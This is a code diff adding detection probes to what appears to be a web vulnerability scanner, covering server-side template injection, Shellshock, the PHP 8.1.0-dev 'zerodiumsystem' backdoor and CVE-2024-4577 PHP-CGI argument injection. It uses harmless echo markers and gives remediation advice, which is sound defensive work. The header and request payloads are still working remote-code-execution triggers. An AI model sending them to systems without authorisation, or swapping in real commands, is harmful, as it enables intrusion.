@@ -337,6 +337,280 @@ class _WebInjectionMixin(_InjectionTestBase):
     return probe_result(findings=findings_list)
 
 
+  # ── SSTI (Server-Side Template Injection) ────────────────────────────
+
+  def _web_test_ssti(self, target, port):
+    """
+    Probe for Server-Side Template Injection via safe math expressions.
+
+    Tests ``{{7*7}}`` (Jinja2/Twig), ``{{7*'7'}}`` (Jinja2 string mult),
+    ``${7*7}`` (Freemarker/Mako) across common parameter names and URL path.
+    Detection: response contains the *evaluated* result but NOT the raw payload
+    (which would indicate XSS reflection, not template evaluation).
+
+    Parameters
+    ----------
+    target : str
+    port : int
+
+    Returns
+    -------
+    dict
+    """
+    findings_list = []
+    scheme = "https" if port in (443, 8443) else "http"
+    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
+
+    ssti_payloads = [
+      ("{{7*7}}", "49", "Jinja2/Twig"),
+      ("{{7*'7'}}", "7777777", "Jinja2"),
+      ("${7*7}", "49", "Freemarker/Mako"),
+      ("<%= 7*7 %>", "49", "ERB/EJS"),
+    ]
+    params = ["name", "q", "search", "input", "text", "template", "page", "id"]
+
+    # Baseline: fetch the page without payloads to filter false positives
+    # (e.g. "49" naturally appears in many pages)
+    baseline_text = ""
+    try:
+      baseline_resp = requests.get(base_url, timeout=3, verify=False)
+      baseline_text = baseline_resp.text
+    except Exception:
+      pass
+
+    # --- 1. Query parameter injection ---
+    for param in params:
+      if len(findings_list) >= 2:
+        break
+      for payload, expected, engine in ssti_payloads:
+        # Skip if expected result already exists in baseline page
+        if expected in baseline_text:
+          continue
+        try:
+          url = f"{base_url}?{param}={quote(payload)}"
+          resp = requests.get(url, timeout=3, verify=False)
+          if expected in resp.text and payload not in resp.text:
+            findings_list.append(Finding(
+              severity=Severity.CRITICAL,
+              title=f"SSTI ({engine}) via ?{param}= parameter",
+              description=f"Template expression '{payload}' was evaluated server-side "
+                          f"to '{expected}', confirming {engine} SSTI. "
+                          "This leads to Remote Code Execution.",
+              evidence=f"URL: {url}, response contains '{expected}' but not raw payload",
+              remediation="Never pass user input directly into template rendering. "
+                          "Use sandboxed template environments.",
+              owasp_id="A03:2021",
+              cwe_id="CWE-1336",
+              confidence="certain",
+            ))
+            break
+        except Exception:
+          pass
+
+    # --- 2. Path-based injection ---
+    if not findings_list:
+      for payload, expected, engine in ssti_payloads[:2]:
+        if expected in baseline_text:
+          continue
+        try:
+          url = base_url.rstrip("/") + "/" + quote(payload)
+          resp = requests.get(url, timeout=3, verify=False)
+          if expected in resp.text and payload not in resp.text:
+            findings_list.append(Finding(
+              severity=Severity.CRITICAL,
+              title=f"SSTI ({engine}) via URL path",
+              description=f"Template expression '{payload}' evaluated in URL path.",
+              evidence=f"URL: {url}, response contains '{expected}'",
+              remediation="Never pass user input directly into template rendering.",
+              owasp_id="A03:2021",
+              cwe_id="CWE-1336",
+              confidence="certain",
+            ))
+            break
+        except Exception:
+          pass
+
+    return probe_result(findings=findings_list)
+
+
+  # ── Shellshock (CVE-2014-6271) ──────────────────────────────────────
+
+  def _web_test_shellshock(self, target, port):
+    """
+    Test for CVE-2014-6271 (Shellshock) by sending bash function definitions
+    in HTTP headers to potential CGI endpoints.
+
+    Safe detection: uses echo-based payload that produces a unique marker
+    in the response body if bash evaluates the injected function.
+
+    Parameters
+    ----------
+    target : str
+    port : int
+
+    Returns
+    -------
+    dict
+    """
+    findings_list = []
+    scheme = "https" if port in (443, 8443) else "http"
+    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
+
+    marker = "REDMESH_SHELLSHOCK_DETECT"
+    shellshock_payload = f'() {{ :; }}; echo; echo {marker}'
+
+    cgi_paths = [
+      "/cgi-bin/test.cgi",
+      "/cgi-bin/status",
+      "/cgi-bin/test",
+      "/cgi-bin/test-cgi",
+      "/cgi-bin/printenv",
+      "/cgi-bin/env.cgi",
+      "/cgi-bin/",
+      "/victim.cgi",
+      "/safe.cgi",
+    ]
+
+    for cgi_path in cgi_paths:
+      if findings_list:
+        break
+      url = base_url.rstrip("/") + cgi_path
+      try:
+        resp = requests.get(
+          url,
+          headers={
+            "User-Agent": shellshock_payload,
+            "Referer": shellshock_payload,
+          },
+          timeout=4,
+          verify=False,
+        )
+        if marker in resp.text:
+          findings_list.append(Finding(
+            severity=Severity.CRITICAL,
+            title=f"CVE-2014-6271: Shellshock RCE via {cgi_path}",
+            description="Bash function injection via HTTP headers is evaluated "
+                        "by the CGI handler, enabling unauthenticated Remote "
+                        "Code Execution.",
+            evidence=f"GET {url} with shellshock payload in User-Agent "
+                     f"returned marker '{marker}' in response body.",
+            remediation="Upgrade bash to a patched version (>= 4.3 patch 25); "
+                        "remove unnecessary CGI scripts.",
+            owasp_id="A06:2021",
+            cwe_id="CWE-78",
+            confidence="certain",
+          ))
+      except Exception:
+        pass
+
+    return probe_result(findings=findings_list)
+
+
+  # ── PHP CGI argument injection + backdoor ───────────────────────────
+
+  def _web_test_php_cgi(self, target, port):
+    """
+    Test for PHP-CGI vulnerabilities:
+
+    1. PHP 8.1.0-dev supply-chain backdoor (zerodium ``User-Agentt`` header).
+    2. CVE-2024-4577: argument injection via soft-hyphen (``%AD``) bypass.
+    3. PHP-CGI source disclosure via ``-s`` flag injection.
+
+    Parameters
+    ----------
+    target : str
+    port : int
+
+    Returns
+    -------
+    dict
+    """
+    findings_list = []
+    scheme = "https" if port in (443, 8443) else "http"
+    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
+
+    # --- 1. PHP 8.1.0-dev backdoor (User-Agentt header) ---
+    try:
+      resp = requests.get(
+        base_url,
+        headers={"User-Agentt": "zerodiumsystem(echo REDMESH_PHP_BACKDOOR);"},
+        timeout=3,
+        verify=False,
+      )
+      if "REDMESH_PHP_BACKDOOR" in resp.text:
+        findings_list.append(Finding(
+          severity=Severity.CRITICAL,
+          title="PHP 8.1.0-dev backdoor: zerodiumsystem RCE",
+          description="The PHP binary contains a supply-chain backdoor that "
+                      "executes arbitrary code from the 'User-Agentt' (double-t) header. "
+                      "This enables unauthenticated Remote Code Execution.",
+          evidence=f"GET {base_url} with User-Agentt: zerodiumsystem(echo ...) "
+                   "returned the echoed marker in response body.",
+          remediation="Replace the PHP binary immediately — this is a "
+                      "compromised build. Use an official PHP release.",
+          owasp_id="A08:2021",
+          cwe_id="CWE-506",
+          confidence="certain",
+        ))
+    except Exception:
+      pass
+
+    # --- 2. CVE-2024-4577: PHP-CGI argument injection ---
+    php_cgi_paths = ["/", "/index.php"]
+    for path in php_cgi_paths:
+      if any("CVE-2024-4577" in f.title for f in findings_list):
+        break
+      try:
+        test_url = (
+          base_url.rstrip("/") + path +
+          "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
+        )
+        resp = requests.post(
+          test_url,
+          data="<?php echo 'REDMESH_PHPCGI_TEST'; ?>",
+          headers={"Content-Type": "application/x-www-form-urlencoded"},
+          timeout=3,
+          verify=False,
+        )
+        if "REDMESH_PHPCGI_TEST" in resp.text:
+          findings_list.append(Finding(
+            severity=Severity.CRITICAL,
+            title="CVE-2024-4577: PHP-CGI argument injection RCE",
+            description="PHP-CGI accepts soft-hyphen (%AD) as argument separator, "
+                        "allowing injection of -d flags to override configuration "
+                        "and execute arbitrary PHP code.",
+            evidence=f"POST {test_url} with PHP echo payload was executed.",
+            remediation="Upgrade PHP; migrate from CGI to PHP-FPM; "
+                        "add URL rewrite rules to block %AD sequences.",
+            owasp_id="A06:2021",
+            cwe_id="CWE-78",
+            confidence="certain",
+          ))
+      except Exception:
+        pass
+
+    # --- 3. PHP-CGI source disclosure via -s flag ---
+    if not findings_list:
+      try:
+        resp = requests.get(base_url + "/?%ADs", timeout=3, verify=False)
+        if "<code>" in resp.text and "<?php" in resp.text:
+          findings_list.append(Finding(
+            severity=Severity.HIGH,
+            title="CVE-2024-4577: PHP-CGI source code disclosure",
+            description="PHP-CGI -s flag can be injected via %AD soft-hyphen, "
+                        "exposing PHP source code.",
+            evidence=f"GET {base_url}/?%ADs returned PHP source code.",
+            remediation="Upgrade PHP; use PHP-FPM instead of CGI.",
+            owasp_id="A06:2021",
+            cwe_id="CWE-200",
+            confidence="certain",
+          ))
+      except Exception:
+        pass
+
+    return probe_result(findings=findings_list)
+
+
   # ── A04:2021 — IDOR indicators ──────────────────────────────────────
 
   _IDOR_PATHS = [
